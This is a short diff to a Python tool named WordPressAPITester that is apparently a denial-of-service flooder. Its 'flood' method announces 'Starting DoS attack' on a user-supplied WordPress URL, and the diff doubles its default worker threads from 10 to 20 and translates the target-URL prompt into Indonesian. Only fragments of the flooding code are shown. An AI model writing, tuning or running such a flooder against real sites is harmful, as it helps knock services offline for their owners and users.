@@ -50,7 +50,7 @@ class WordPressAPITester:
             print(f"[ERROR] {method} {full_url}: {e}")
             return None
 
-    def flood(self, url, workers=10, duration=60):
+    def flood(self, url, workers=20, duration=60):
         print(f"[INFO] Starting DoS attack on {url} for {duration}s with {workers} threads")
         start_time = time.time()
 
@@ -67,7 +67,7 @@ class WordPressAPITester:
                 future.result()  # Menunggu semua thread selesai
 
 def main():
-    target_url = input("Enter target WordPress URL (e.g., https://example.com): ").strip()
+    target_url = input("Masukan url target WordPress (e.g., https://example.com): ").strip()
     if not (target_url.startswith("http://") or target_url.startswith("https://")):
         print("[ERROR] Invalid URL. Please include http:// or https://")
         return
